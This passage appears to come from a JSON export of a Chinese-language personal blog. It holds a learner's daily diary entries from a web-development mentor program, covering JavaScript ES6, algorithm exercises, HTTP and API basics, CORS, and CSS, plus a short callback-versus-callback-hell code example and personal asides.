64%。雖然進度感覺不多，但是學了蠻多新東西： 第一次做 Unit test npm script 與 npx 的用途 ES6 的 let 與 const ES6 的字串模板 ES6 的解構賦值 ES6 展開運算子 學到的事情今天最有趣的應該是 Unit test 吧，第一次做的感覺還蠻有趣的，原來實際做測試是這樣子的感覺。另外也有跟著玩了一下 TDD（Test-driven development）的開發方式，覺得這也許是未來可以嘗試看看的模式，感覺做出來的東西會比一般的開發方式更可靠！ 另外也蠻開心重新認識了 ES6 的新語法，儘管以前就已經在網路上看過一些教學文章，但總還是半知半解的感覺，沒有真正理解每個語法的使用方式。 其中最特別的是解構副值與展開運算子吧，原來用「對應」跟「拆開」這兩個簡單的概念就可以用很簡單的方式理解這兩個東西在做什麼，實在是太讓人震驚了。 以前的自己太容易死記東西了，所以學的效果才會沒有很好的感覺。雖然不知道現在會不會有些地方還是做得不太好，但是希望自己能逐漸改善，讓自己一天比一天還要更進步。 題外話希望聖誕節可以吃到好吃的蛋糕或是薑餅。（因為現在是半夜，所以聖誕節才剛開始而已 &gt;&lt;） 期許今天預期的進度沒有達到（[JS102] 與 [ALG101]），希望明天可以把它實現！","link":"/2021/12/25/mentor-program-day14/"},{"title":"mentor-program-day15","text":"想再過一次聖誕節。 進度今天把 [JS102] 給看完了，只有這樣子。因為昨天沒有睡好，累了，給自己休息一天。 還是有加減做一點筆記： ES6 的其餘運算子 ES6 的預設參數值 ES6 的箭頭函式 ES6 的模組機制 babel-node 初體驗 另外也有把 水仙花數 這一題給解出來。不過我真的累了，所以明天在來檢討 QQ 學到的事情今天也是滿滿的 ES6，其中最有感的是「其餘運算子」吧，以前常常分不清楚它跟「展開運算子」的差別；應該說我根本不知道其餘運算子是幹嘛用的，可能它太邊緣了。但這次有弄清楚了，希望未來有機會能好好使用它。 另外就是有點讓人亂七八糟的 import 跟 export。該怎麼說，寫法實在有點多樣，有的時候還會不小心跟 CommonJS 的 exports 跟 module.exports 給搞混。因此這次筆記做好做滿，也有釐清 ES6 跟 CommonJS 的差異所在，希望以後不會再搞混。 題外話雖然今天沒有吃到蛋糕（因為下雨），但還是蠻開心的一天。跟女朋友待在一起其實就是最幸福的事。 期許明天如果沒有過太嗨的話，希望把 [ALG101] 的進度給補完，跟能開始做 week3 的作業的話就好了。","link":"/2021/12/25/mentor-program-day15/"},{"title":"mentor-program-day16","text":"時間過特別快的一天。 進度今天進度很 low，只有跟著 [ALG101] 的進度做了幾題題目。主要是花了比較多時間在檢討跟複習之前寫完的題目： 判斷等比數列 水仙花數 印出聖誕樹 學到的事情在檢討題目時，發現真的要再次複習才會知道自己有沒有真的理解。很多時候當下都會以為懂了，但過一段時間再回來看就又滿臉問號 QQ。 雖然自己盡量都是在解完題目後才去看檢討影片，不過看完後都會覺得自己的解法沒有很漂亮，或是邏輯不夠順暢的問題。另外，變數的命名真的能算是一門學問，有時候怎麼取都覺得怪裡怪氣的，雖然也不用太糾結就是了。 其實每次解完一道題目，檢討之後就能學到一些新的技巧，或是新的細節，所以還蠻喜歡做題目的。也有一個很酷的事情，就是我學了這麼久還真的不知道 JavaScript 有提供科學記號的表示方式，真是太神奇了 XD 題外話「黑女巫肉桂可可」大概是全聯目前出過最屌的蛋糕，作為聖誕節的慶祝蛋糕再適合不過了。可惜它是期間限定，01/06 後就買不到了，這幾天可能會再買來吃爆 QQ 鬼滅真的太會吊人胃口啦啦啦，一個禮拜一集簡直過份。 期許明天希望能把 [ALG101] 跟完 unit6 的進度，然後開始把 week3 的作業給完成。","link":"/2021/12/27/mentor-program-day16/"},{"title":"mentor-program-day17","text":"做了很多題目的一天。 進度今天主要就是做 LIOJ 上的題目，紀錄幾個我覺得蠻有趣的題目： 信用卡號驗證 生命靈數 判斷迴文 另外解題的過程也有做幾個新的筆記，特別是「正則表達式」的部分： 怎麼用正則表達式限制連續次數 把字串轉成數字的 4 種方法 學到的事情現在做題目的時候，除了用程式三寶之外也會思考怎麼用內建函式來讓程式碼變得更簡潔。一個題目我都會用兩種解法來解解看，雖然這樣相對也比較花時間，但覺得能學到的東西也比較多： 測試自己能不能不依賴內建函式 測試自己能不能用內建函式來省去沉長的程式碼 雖然做的題數不多，但我學到很多。 另外在學了 Unit test 後，做測試的時候能想到更多可能出現的情況，感覺很蠻有趣的，也因為這樣想到了奇葩的 input，順道的就複習了一些正則表達式的應用。 總而言之，感覺自己現在寫 code 的時候會考慮的比以前更周全，不管是邊角案例或輸入驗證都能設想的更周到，另外也蠻喜歡 TDD 的開發方式，看到一排綠燈亮起時真的會有心花怒放的感覺 ◉‿◉ 希望接下來的路程中能學到越來越多東西。 題外話明天是麥當勞雞塊買一送一活動的最後一天，吃爆吃爆。 期許感覺得開始趕點進度，希望明天至少把 [ALG101] 的 unit6 完成，然後開始做 week3 的作業。","link":"/2021/12/28/mentor-program-day17/"},{"title":"mentor-program-day18","text":"一樣是做題目的一天。 進度做題目雖然能學到蠻多東西，但也確實比較花時間。今天把 [ALG101] unit5 的指定題目做完了，明天應該就趕快趕上該有的進度。 今天也有把一些覺得不錯的題目給筆記： 平面距離計算 凱薩加密 其實應該還有個圈圈叉叉，但來不急做完，所以明天再補上。 學到的事情今天做的題目都跟找規律有關，覺得自己有比較知道要怎麼找規律一點，一個題目也比較能想到一種以上的解法，不知道是不是自己題目做多了所以思考的方式有變厲害了（希望是）。 題外話吃東西很快樂，但吃東西身材又會變腫，真是件傷腦筋的事情。 期許明天希望可以把 [ALG101] 的進度補完（這個期許好像有點多次了，希望真的能完成），還有 week3 的作業跟開始進行 week4 的進度。","link":"/2021/12/29/mentor-program-day18/"},{"title":"mentor-program-day19","text":"過得很快卻也漫長的做題目時間。 進度今天看了 [ALG101] unit5 的檢討影片，重新審視自己前幾天做的題目如何，有學到一些新的解法，都記錄在我的 repo 裡面了。 接著也開始做 [ALG101] unit6 內建函式的部分，雖然還沒全部做完，但相信明天就能搞定了。 另外也有把昨天的坑填完，還有一些簡單的紀錄： 圈圈叉叉 兩種實作 trim 的方法 大概就是這樣！ 學到的事情在檢討「平面距離計算」的時候特別深刻，因為有人在留言區提供了一個很簡潔的解法，覺得這解法真的夠潮，也幫我複習了前幾天學到的東西，所以也不意外的 記錄 下來了。 覺得多看別人的解法是件很有趣的事情，也能從中學到不同的思考方式，希望自己接下來變得越來越強。 題外話雖然天氣很冷，但還是希望能堅守每個禮拜至少慢跑一次的習慣。雖然有時候覺得慢跑還蠻累的，但是在每天處於學習的狀態下，這是一段能讓心情沉澱一下的小時光，這樣子想就會覺得也沒那麼辛苦。 期待跨年夜的到來～ 期許希望明天能進到 week4 的進度，這週的內容算是第一次接觸，還蠻期待的。","link":"/2021/12/29/mentor-program-day19/"},{"title":"mentor-program-day20","text":"新年快樂。 進度終於把 [ALG101] 的 unit6 給完成。花了不少時間，但學到很多東西，其實還是蠻值得的。另外也把 [JS101] 的進度補完，只差檢討影片還沒看而已，但應該很快就能完成。 一樣附上今天做的一些筆記： 實作 join 的三種方法 費式數列 找出第 n 個最小值 還有更新一些實作的部分： 實作字串內建函式 實作陣列內建函式 學到的事情今天一樣學到了很多不同的解題思維，覺得一個題目有各種解法是寫程式最有趣的地方。 還有一件最有趣的事情是在做「費式數列」的時候深深體會到「時間複雜度」帶來的影響，還有「用空間換取時間」這件事情帶來的效益遠超乎我想像來的大。一個簡單的例子讓我深深體會到演算法是一個很重要的東西。 希望以後有時間的話能鑽研更多跟演算法有關的知識。 題外話今天就是跨年了，先說聲新年快樂，希望在這一天的每個人都能感到開心。 期許明天應該會給自己放一天假，跟女友好好散散心，所以不會有進度。","link":"/2021/12/31/mentor-program-day20/"},{"title":"mentor-program-day21","text":"聽說今天放假？ 有沒有堅持做過某件事情很久呢？既然今天休假，那就來分享一下自己生活上的事情好了。 其實我每天都有一個習慣：每天寫下次自己的目標 15 次 會開始做這件事情是因為我在某個地方裡面學到的一種哲學吧？據說只要每天這樣子做，就能在無形中得到一股幫助你達成目標的助力。 嗯，我也覺得聽起來挺瞎的。 所以我就這樣不知不覺做了兩個月左右： 儘管在我做這件事情後，確實有得到一些以前沒有的機會，例如說「慢慢累積出比較像樣的作品」、「得到面試的機會」等等，但也不能說這完全是因為做了這件事情而得到，畢竟實際上付出更多的是不停的學習與努力。 目前的我依然還沒實現這個目標，但這件事情在不知不覺中已經變成了一種習慣，彷彿是真是假都無所謂了，只是想單純想把一件事情堅持下去的這種心情。 未來的路會怎麼樣其實自己也不清楚，但相信自己依然在一步一步地向著目標前進。只要不停下腳步，總有一天會到達的；儘管這可能要花上很多時間。 總而言之，不知道這個世界上有多少人也像我一樣，目前也正在不停地堅持著努力去做某件事？ 想說的事情很簡單： 希望大家都能夠得到自己所追求的事物，儘管這件事在別人眼裡看起來很渺小，也不要放棄堅持下去。哪怕只是一件小小的事情，只要累積起來都有可能變成是人生裡意義重大的事。 最後分享一下女朋友很喜歡的歌：優里－ドライフラワー，一首會讓心情感到治癒的歌 (｡•ㅅ•｡)♡","link":"/2021/12/31/mentor-program-day21/"},{"title":"mentor-program-day22","text":"新年後的第一篇，廢了兩天QQ 進度在廢了兩天後，還是得好好收心回來趕進度。 今天正式開始 week4 的進度，所以把 [NET101] 看到了 69%。另外也把 week3 的作業給檢討一遍，檢討後也意識到自己依然很淺的事實，得更加好好加油才行。 其實有蠻多東西想筆記下來的，不過今天花了比較多時間在看影片，所以等影片看完後才會正式把完整的筆記給 PO 上來。 學到的事情今天學到的東西很多，像是網路之間的溝通方式，還有各種標準化後而制定的協議（Protocol）。 儘管以前大學時有修過「資訊管理安全」這門課，內容大部分也涵蓋了 [NET101] 裡提到的那些專有名詞，但是當時只覺得好複雜，所以處於一個半知半解的狀態，好在今天算是有釐清一些基本的概念了（老實說還是有點複雜 XD） 希望接下來能夠透過更多的實作來把網路之間的知識給弄得給清楚。 題外話收假除了收心之外也要好好來收（瘦）身了，過得太開心 XD 期許希望明天可以把 [NET101] 補完，跟把筆記給做完，還有作業的部分也盡快完成。","link":"/2022/01/03/mentor-program-day22/"},{"title":"mentor-program-day23","text":"有點難做筆記的一天。 進度今天把 [NET101] 給看完了，所以開始補筆記的部分，目前做的有： 快速重溫 TCP/IP 四層模型 基本的串接 API 練習 SDK 與 API 之間的關係 建立一個最基本的 http-server curl 的使用方法 在 Node 指令中帶入參數 在做 TCP/IP 筆記的時候花了比較多時間思考該怎麼做才好。感覺有些地方還是沒有弄懂，教學文章也重複看了不少次，但感覺就是哪裡少了什麼這種感覺QQ。目前盡力先把自己理解的部分給整理出來了，希望之後越來越熟悉時可以再回來把一些細節給弄清楚。 學到的事情今天學到最棒的事情是「RESTful」的風格吧，以前看過不少教學文章，那些教學文章都花了很多時間解釋什麼到底是 RESTful？但我覺得都沒有說到重點，所以沒能理解 RESTful 的意義以及為什麼要用它。 但 [NET101] 裡面提到了一件很重要的事情：不用 RESTful 的 API 會長什麼樣？會有什麼問題？ 當這問題提出來後我就被打通任督二脈，瞬間理解了 RESTful 的概念，接著再回去看那些文章的時候我也才真的看懂那些文章在講的是什麼概念。 題外話不知道現在的自己成長到了什麼程度，雖然也才短短 23 天，但是感覺自己學到了很多東西。雖然說學到很多東西應該要感到開心才對，但還是會有點擔心自己未來能是否能成為自己心目中的樣子。 我沒有覺得大家都一定要繼續前進，停在原地也是自己的選擇，而這選擇沒有對錯。但對我自己來說，我就是沒辦法接受自己原地踏步。所以如同開頭所說的，在這種心不足力也不足的狀態之下，才會感受到不安與愧疚吧，覺得自己應該做點事，可是卻又提不起勁來。 這些話不知道為什麼看起來特別有感觸，有時候自己確實也很難接受自己在原地踏步，可是又真的在有些時候會提不起勁來。 現在能做的就是盡力去做吧？儘管會提不起勁，也要讓自己不停地往前走。 期許明天要繼續把沒做完的筆記給做完 orz，希望進度順利的話能開始做 week4 的作業。","link":"/2022/01/04/mentor-program-day23/"},{"title":"mentor-program-day24","text":"學到越來越多新東西的一天。 進度今天主要就是做筆記，跟無聊的時候做了一題 LIOJ 上的題目： 建立 Array 的別種方法 什麼是 DNS？ HTTP 懶人包 SOAP 另一種跟伺服器溝通的協議 關於 IP 地址 你不知道的 hosts 設定檔 到底什麼是 RESTful？ 另外也看了 [MTR01] 的部分內容，裡面真的是講到我以前完全不知道的東西，太神了。明天一定要把剩下的部分看完。 學到的事情今天其實就是把筆記做完，重溫了一下前幾天在 [NET101] 學到的知識，感覺自己有越來越理解網路的架構是怎麼樣。 有件比較有趣的事情是本來只是無意間想說去看一下 [MTR01] 的部分，來做點補充知識。結果不看還好，一看才學到一大堆以前一直在我身邊但我卻不知道它實際用途的東西。 例如說前端是怎麼透過 from 表單是跟後端 server 做溝通的，這一點我覺得非常重要，但很可惜我以前學習的時候都沒有去鑽研這部分的知識。（每次看的書都說這部分屬於後端，所以不多做解釋 orz） 另外也學到一些有趣的小知識，像是「為什麼你在填表單的時候案 xx，瀏覽器會跟你說你真的要離開嗎？」，還有「為什麼你貼搜尋頁面給別人，別人可以看到一樣的資料，但你如果把填到一半的表單貼給別人只會是一片空白」。 這些事情是以前的我都不知道的，但 [MTR01] 解釋了這些事情，很慶幸自己有看到這個教學影片。 題外話感覺自己有比較打起勁來了，想要學習更多讓自己變得越來越厲害。 期許希望明天可以把 [MTR01] 的部分看完，跟做一點筆記，接下來就可以開始做 week4 的作業了。","link":"/2022/01/05/mentor-program-day24/"},{"title":"mentor-program-day25","text":"衝衝衝～ 進度順利的把 [MTR01] 給看完了，也做了蠻多的筆記： 四種發 request 的方法 form 的 GET 與 POST 的差異 放在 form 裡面的 button 實作 JSONP 套件大總匯 JSON 的格式也可以是陣列 今天學到蠻多東西的，開心！ 學到的事情今天學到最多的是自己實作 JSONP 的流程。 該怎麼說呢，可以身兼前端與後端的感覺很好，因為你可以很清楚從頭到尾究竟發生了什麼？而不是只有「我問你東西，你給我答案」的這種感覺。 另外自己串 week4 上的 API 時，也體會到如果要讓使用者體驗很好，要注意的細節真的還蠻多的。 例如說「拿不到資料的時候怎麼辦？」或是「如果請求成功但不會有回傳訊息的時候你該怎麼跟使用者說？」等等。 雖然這些跟作業沒什麼關係，該有的東西做得出來就好，但未來在實際工作的時候還是得學會如何處裡這些事情吧。 題外話 如果自己做不出來的東西，可以先試著找適合自己的 library 來用，原理可以等未來比較瞭解後再去鑽研就好。 我覺得自己該把這段話銘記在心。雖然我不喜歡依賴套件，但仔細想想如果沒辦法把功能做出來的話，我的產出就是「零」，這不是什麼好事。 所以我也特別開了 套件大總匯 這篇文章，決定開始蒐集好用的套件。希望未來我在開發任何東西的時候都能得心應手。 當然，最後如果能自己學會原理的話就更好了。 期許希望明天可以把 week4 的作業做完，如果做完的話就可以開始 follow 下週的進度了。","link":"/2022/01/06/mentor-program-day25/"},{"title":"mentor-program-day26","text":"很難得的進度不錯！ 進度今天把 week4 的作業給完成了，雖然還沒有檢討完，但有大略看了一下檢討內容，真的是滿滿精華，希望明天可以再做更完整的檢討。 一樣附上今天做的筆記： for 迴圈的延伸 for…in 與 for…of 你覺得什麼是 API？ 串接 Twitch 的 API 在 Node.js 設定環境變數的方法 學到的事情今天學到最多的大概是怎麼看 API 文件吧，因為原本作業要串的舊版 Twitch API 已經不給串了： Legacy Twitch API v5 is deprecated and scheduled to be decommissioned on February 28, 2022. For more information, refer to the timeline announcement and the v5 migration guide to use the latest version of the Twitch API. 基於這個原因，所以得自己去看新版的 API 文件來想該怎麼串。 距離上一次認真花時間看英文好像已經有段時間了，所以今天實在看得有點吃力，大概只看懂了 50~60% 的內容，真的是幫QQQQQQ。 不過好在平常還是有背單字的習慣，再加上以前有段時間花了蠻多時間練習英文的，所以仔細想想也沒真的那麼糟啦，就再多多練習這樣吧，希望以後真的能把英文越看越順暢一點。 然後也覺得 API 文件其實真的沒那麼複雜，說穿了就是一本使用手冊而已，照著上面說的做，絕對不會出錯。原本覺得 Twitch 的 API 文件好複雜，但現在再回去看也覺得還好，其實寫得還蠻清楚的，只是我英文太 low 了而已 ( ´•̥̥̥ω•̥̥̥` ) 題外話 世界上有 10 種人，一種是懂二進位的，一種是不懂二進位的。 這句話真的很有趣，不知道你是哪種人呢？ 期許希望明天可以把 week4 的作業檢討完，把自己的壞習慣給處理掉，也希望順利的話可以開始超前進度到 week5，或是做做挑戰題也不錯。","link":"/2022/01/07/mentor-program-day26/"},{"title":"mentor-program-day27","text":"燒腦袋啊。 進度今天把 week4 的作業檢討完了，也做了一點筆記： 理解什麼是 race-condition 在做 JSON.parse 之前 想遵循的變數命名方式 另外也嘗試做了 week4 的挑戰題，很不意外的卡關了( ˘•ω•˘ ) 學到的事情來分享一下今天寫挑戰題的心得吧，原本以為只是單純串串資料來顯示而已，但寫了才發現一堆細節藏在裡面。 其實我一開始就卡關了，我以為 API 有直接提供「最受歡迎的遊戲實況列表」，但是不是這樣子。 所以後來看了 exmplae 的解答，結果有看沒有懂，只好自己一行一行跟著寫，去思考裡面的邏輯是什麼，好不容易算是摸出一點頭緒了，不過我覺得這樣還是不夠，自己又擦掉重頭做一遍，想看看只靠自己有沒有辦法解出來。 最後的結果算是理解了 50% 吧（我自己覺得啦），callback 跟 recursive 這兩個東西可以說是我的大魔王，應該說是當數量少的時候還沒什麼問題，但是當霹靂啪啦出現一大堆的時候，腦袋就會打結了，這也是我覺得這個挑戰題最困難的地方 ( ´•̥̥̥ω•̥̥̥` ) 現在我完全能理解為什麼 ES6 會推出 Promise 跟 Async/Await 的原因了，大概就是為了幫助像我一樣容易腦袋打結的人吧… 題外話有人也會買外面的咖哩自己回來煎成蛋包咖哩飯嗎？這樣超棒的 (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ （其實只是外面要買到好吃的蛋包咖哩飯好貴啦） 期許明天想開始去跑 week5 的進度，然後當然是能做越多越好這樣吧！","link":"/2022/01/08/mentor-program-day27/"},{"title":"mentor-program-day28","text":"挑戰題 = 時間小偷？ 進度在昨天燒了一天的腦袋之後，今天的我還是不甘心，想要把挑戰題的解題方式給弄得更透徹一些，於是一天就又這樣不支不覺得過去了，附上一下戰績： 串接 Twitch 的 API（挑戰題） 是花了蠻多時間啦，但至少有比一開始清楚多了，感覺現在只要看到「非同步」就會有「啊，這要加上 callback 來拿結果」這種反射動作 ( ˘•ω•˘ ) 解決完挑戰題後也做了一下 week5 的 Lidemy HTTP Challenge，覺得還蠻好玩的，用一種很有趣的方式來學東西這樣，最後也在沒看提示的前提下破關了（lv10）。 學到的事情覺得要學會怎麼善用 function 來包裝一段程式碼是一個需要累積很多練經驗才能越做越好的事情，現在的我欠缺的就是這些吧，所以在想要怎麼優化的時候才會花了不少時間，希望未來可以把這部分越做越好。 從我學習到現在，「把大問題拆成小問題」或是「化繁為簡」這兩個方法還幫助我蠻多的，有時候當你先解決那些小問題，或者是先把問題給簡化，最後你再去理解那個大問題的時候通常就能迎刃而解。 舉例來說，在處理非同步行為的時候，出現各種 callback 時總會讓人弄得頭昏眼花的，所以我會試著先把那些 callback 寫成一個明確的 function（命名函式），這樣子在把 callback 傳入某個非同步 function 的時候就不會看得眼花撩亂，因為你能一眼就看清楚架構，比如這個例子： 123456789101112131415161718192021222324252627282930313233343536// 第一個非同步 functionfunction A(callback) { setTimeout(callback, 1000)}// 第二個非同步 functionfunction B(callback) { setTimeout(callback, 1000)}// 第三個非同步 functionfunction C(callback) { setTimeout(callback, 1000)}// 第一個 callbackfunction callbackA() { console.log('first!') // 在這裡呼叫下一個 function =&gt; B B(callbackB)}// 第二個 callbackfunction callbackB() { console.log('second!') // 在這裡呼叫下一個 function =&gt; C C(callbackC)}// 第三個 callbackfunction callbackC() { // 這是最後一個，沒有其他 function 了。 console.log('third!')}/* 執行順序： A =&gt; A 的 callback 呼叫 B B =&gt; B 的 callback 呼叫 C C =&gt; C 的 callback 印出結果，結束 */A(callbackA) 不這樣寫的話就是大家俗稱的「波動拳（callback hell）」： 12345678910111213141516171819202122232425// 第一個非同步 functionfunction A(callback) { setTimeout(callback, 1000)}// 第二個非同步 functionfunction B(callback) { setTimeout(callback, 1000)}// 第三個非同步 functionfunction C(callback) { setTimeout(callback, 1000)}// 執行第一個 function =&gt; AA(function() { console.log('first!') // 在這裡呼叫下一個 function =&gt; B B(function() { console.log('second!') // 在這裡呼叫下一個 function =&gt; C C(function() { console.log('third!') }) })}) 雖然以這個例子來說可能會覺得第二種寫法比較簡潔，但那是因為這裡的 callback 要做的事情很少，等事情一大堆的時候你就不會這樣覺得了。 題外話今天跟女朋友一起去全聯買材料回來煮火鍋，真是便宜又好吃 (´,,•ω•,,)♡ 期許希望明天可以開始做 week5 的進度，跟把今天學到的東西做好筆記。","link":"/2022/01/09/mentor-program-day28/"},{"title":"mentor-program-day29","text":"來不及打日記的一天。 進度本來是想把筆記打完再來寫紀錄的，但最後筆記的內容比我想像中來的長，所以拖到隔天才來補，附上一下當時做到一半的筆記： 從遊戲來認識 CORS 與瀏覽器的限制 HTTP Challenge 攻略與心得 Node 中的 buffer 模組 主要就是這樣，剩下就隔天再來補完。 學到的事情在玩了 Lidemy HTTP Challenge 後，學到了蠻多東西，來用個很少用的「條列式」來敘述一下： 1. http basic authentication 一種 HTTP 驗證的方式，在我串 Twitch API 的時候也有用到，只是用的是「bearer」不是「basic」。 2. buffer 學到了怎麼處理二進制的資料，也學到了一種新的編碼方式「base64」 3. CROS 與瀏覽器限制 在做了筆記後，才真正理解在「瀏覽器」會受到哪些限制。這是很有意思的部分，因為當不是在瀏覽器的時候，很多限制就都沒有了，能做的事情也更多了。 題外話自從串了 Twitch 的 API 之後，每天都要上 Twich 看一下小當家。 不知道這到底是哪個天才改的字幕。 期許明天要把筆記補完，還有開始趕進度。","link":"/2022/01/11/mentor-program-day29/"},{"title":"mentor-program-day30","text":"每一天都要比昨天的自己更好。 進度今天順利把昨天沒做完的筆記做完了： 從遊戲來認識 CORS 與瀏覽器的限制 HTTP Challenge 攻略與心得 也看了一點 [FE101]，目前看到 37%，也就是 HTML 的部份，所以也做了一個簡短的筆記： HTML 基礎 另外就是做了一題 LIOJ 的題目：不合群的人，沒想到最後的解法比我預期中乾淨，還不錯。 學到的事情今天分享一下跟 HTML 有關的事好了。看完 [FE101] 後發現有些標籤太邊緣了，導致我都忘記他們的用途了： &lt;pre&gt; 可以保留編輯器的文字格式 &lt;caption&gt; 因為有講到 &lt;table&gt; 所以就剛好想起了這個標籤 &lt;a&gt; 重點不是這個標籤，是原來 target 的預設屬性值是 _self &lt;iframe&gt; 原來除了 google map 外還可以嵌入整個網頁，也順便學到一個新的 header：x-frame-options &lt;label&gt; 我想我這次真的記得他要怎麼搭配著用了 其他還有像是表單元件 &lt;input&gt;、&lt;select&gt; 都一定要設定 name 跟 value，這樣 server 才能收到資料。這個是多虧寫了 form 的 GET 與 POST 的差異 這篇文章，讓我更清楚前後端是怎麼交換資料的，要不然我以前真的不知道這兩個屬性對後端的意義是什麼。 還有就是 SEO 的部分，這部分也在 [FE101] 裡學到蠻多的，希望之後能好好善用這些知識來做出最基本的 SEO。 題外話小當家這部動畫為什麼這麼有魅力呢？ 女朋友跟我說小當家的直播是從 2021 年的 8 月開始做馬拉松直播的，但現在都已經一月份了，每天還是有一群瘋狂的人等著看那部熱淚盈眶的劇場版（業火的異人館），真是太神奇了。 期許希望明天能把 [FE101] 給看完，然後做完筆記開始切版。","link":"/2022/01/11/mentor-program-day30/"},{"title":"mentor-program-day31","text":"一個月過去了。 進度今天把 [FE101] 看完了，做了一些筆記： 利用 border-radius 來畫圓形 CSS Selector 的權重 CSS pseudo-element CSS 中的定位（position） CSS 中的 display 屬性 其他還有一些筆記還沒做完，明天會再補上來。 學到的事情今天複習了蠻多以前學過的 CSS 知識，不過有些東西是我以前不知道的，我覺得還蠻有趣的： 1. border-radius 畫圓形的原理 我知道這個屬性可以拿來畫圓形，但我一直不知道的是它的原理是什麼，所以今天在因緣際會下查了一些資料，最後弄明白了。 2. CSS Specificity 其實就是「權重」，只是他的英文念起來特別酷所以才寫英文（硬要烙）。 以前就知道 CSS Selector 背後有套計算公式，但也是很可惜都沒去特別查資料，能在今天弄懂真好！ 3. pseudo-element 的運用 以前最常拿它來畫三角形或裝飾品，今天額外學到原來還有個 attr() 的用法，所以立馬給筆記下來！ 4. position sticky 也是知道有這個屬性，但實際不常用到，再加上要考慮支援度的問題，所以也是邊緣到被我忘記 QQ，今天把它筆記下來，相信之後要用到就能馬上回來查了。 其他還有很多很多就不一一列出來了。CSS 是個很深的坑阿，能用的屬性太多了。 題外話最近發生了一點事情，雖然不知道自己還可以撐多久，但是一定要振作起來。 期許希望明天能把沒做完的筆記做完，然後應該可以開始做 week5 的作業了。","link":"/2022/01/12/mentor-program-day31/"},{"title":"mentor-program-day32","text":"超英趕美。 進度今天把昨天的沒做完的筆記補完了： CSS 一些久了可能會忘記的屬性 CSS 盒模型（box-model） CSS 垂直置中 CSS 讓文字有 … 的效果 CSS nth-child CSS nth-of-type CSS 之我的圖片有縫！ 另外也很意外地居然只花 2 小時左右就把 week6 的版切好了！（含 RWD）： 雖然拿給某個叫 Amos 的看一定被笑說「這就稀飯版阿」，但還是挺意外能看到自己成長了許多。 學到的事情今天一樣做了不少跟 CSS 有關的筆記。其實挺難得的，第一次有想要趕快切版的心情，也許是因為學到了很多東西，所以才迫不急待想試試手感的這種感覺吧？ 另外也看特地下載了一些同學切版的作業來看，感覺像是看到了以前的自己。不知道大部分的人在剛開始學 CSS 的時候是不是都像我一樣有這些心情，「Class 一大堆好亂好煩」、「我這樣寫是對的嗎？」、「這邊到底要設 px 還是 %」、「怎麼 HTML 結構就是對不上來」、「RWD 該怎麼設定」等等之類的 OS。 其實在看到大家都有同樣的感受時，我慢慢地釋懷了。不是我很笨學不好 CSS，而是 CSS 就跟寫 JavaScript 一樣，沒有絕對正確的解法，所以你不需要要求自己做到最完美，只要以自己的能力來盡力達成目標就好了。在 CSS 的世界裡，版面只要看起來一樣就好，在 JavaScript 的世界裡也一樣，只要我 input 東西進去，output 出來能夠一樣，就算跟別人的作法不一樣，又有什麼不可以呢？ 不過這也不是說要永遠把自己侷限在某個點，當然還是要盡可能讓自己越來越好。只是我想說的是，不要因為自己當下的能力不足就否定掉自己的一切，其實不是能力不足，只是需要時間來慢慢成長罷了。最重要的事情還是先把眼前能做的給做到做好，這樣子想也許就不會總是常常感到心情疲憊了。 題外話最近疫情好像又嚴重起來了，還是希望不要變得越來越嚴重才好。 期許明天沒意外會繼續做 week5 + week6 的作業吧，還有想開始把一些以前做的筆記給補上來。 其實回過頭過去看以前寫的東西，能看到以前的自己真的還蠻努力學習的，可是也許我太追求完美了，所以常常卡在一個地方卡了好幾天，好幾天。 人不可能一下子就完美的學好所有東西，如果真的要做到這種程度，就算花上一輩子的時間也不一定做的完吧。","link":"/2022/01/13/mentor-program-day32/"},{"title":"mentor-program-day33","text":"我能變成自己想成為的模樣嗎。 進度今天想了一些事情後，對於一些以前沒有很理解的東西有了新的想法，所以花了一點時間寫文章，結果就不知不覺一個下午又這樣過去了： 正則表達式之「我只想要 xxx 裡面的內容」 先理解作用域跟回傳值，再來談閉包。 另外也做了 week5 的作業，一個是 大平台，另一個參考前幾屆學長姊的心得來寫感想，覺得每個人都還蠻厲害的，在面對了這麼多困難還是能夠撐到最後，成為獨當一面的工程師。 學到的事情今天寫的兩篇文章應該是我學到最多的東西吧，女朋友以前就跟我說過「以後可以的話試著用自己的想法來寫寫看」這件事，而今天也算是如願以償做到了。雖然自己覺得不完美，但是能夠跨出第一步也是件不錯的事情吧。 另外就是在看了很多學長姊的心得後，心情不禁有點複雜，一方面是擔心後面的課程壓力會越來越重，另一方面是擔心自己的程度是不是比別人落後許多。 也許這是我的壞習慣，總會往不太好的地方想，也很多時候會害怕自己重蹈覆轍，重複以前的錯誤。像是以為自己已經學會了，以為自己什麼都懂了，但最後碰到一些事情後才發現「阿，原來我不過是個以管窺天的井底之蛙」的這副狼狽模樣。 雖然現在已經過了 33 天，但是我能理直氣壯的跟 33 天前的自己說「我比現在的你強上了好幾倍」這種話嗎？我不知道，也許只是有些焦慮，當自己很有自信的時候，感覺自己什麼都能夠做到。但是當自己陷入低潮的時候，就會像現在這個樣子，不知道自己到底在做些什麼。 也許我需要一點時間靜靜，但是我很清楚的是，我一定要努力把這份計劃給走完。 題外話大家都在減肥，我也想減肥，不過減肥真的是件困難的事情。 期許希望明天可以把 week5 的心得部分做完，然後繼續 week6 的作業。","link":"/2022/01/14/mentor-program-day33/"},{"title":"mentor-program-day34","text":"好快rrrr 進度今天把之前沒解完的 Lidemy HTTP Challenge 給破關了，也更新了攻略的內容與心得： HTTP Challenge 攻略與心得 對，今天好像就只做了這件事，有幾關卡太久了QQ 學到的事情因為今天都在破關，所以心得的部分就直接參考 HTTP Challenge 攻略與心得 吧！ 題外話有人試過「鮪魚蛋飯」嗎？這是一道便宜又好吃的料理，只需要： 蛋 白飯 鮪魚罐頭 就可以滿足一餐的美味佳餚，不知道為什麼外面沒有賣這種美食呢？ 期許希望明天可以把 week6 的作業做完。","link":"/2022/01/15/mentor-program-day34/"},{"title":"mentor-program-day35","text":"GOGOGO～ 進度今天把以前做的筆記重新整理，也順便複習一下： CSS 中那些常常忘記的預設值 使用 來設定 RWD 圖片 CSS 中的 counter 屬性 讓你不再煩惱圖片尺寸問題，object-fit 與 object-position 網頁中的英文大小寫問題 螢幕閱讀者友善的 a 標籤 如何正確的隱藏文字 更彈性化的文字設定，max-width 與 max-height CSS 之我的 scrollbar 比較好看 CSS 中 html 與 body 的向上傳遞行為 CSS 之 inline-block 中的魔法間距 CSS 之 與 的寬高 CSS 之 margin 負值的內涵 CSS 之什麼時候該設定成相對單位 讓網頁變得更潮，prefers-color-scheme CSS 中的 overflow 與圓角的關係 寫完才發現真多啊。 學到的事情以前寫的大多是跟 CSS 有關的東西，挺懷念以前為了 CSS 還特別去找 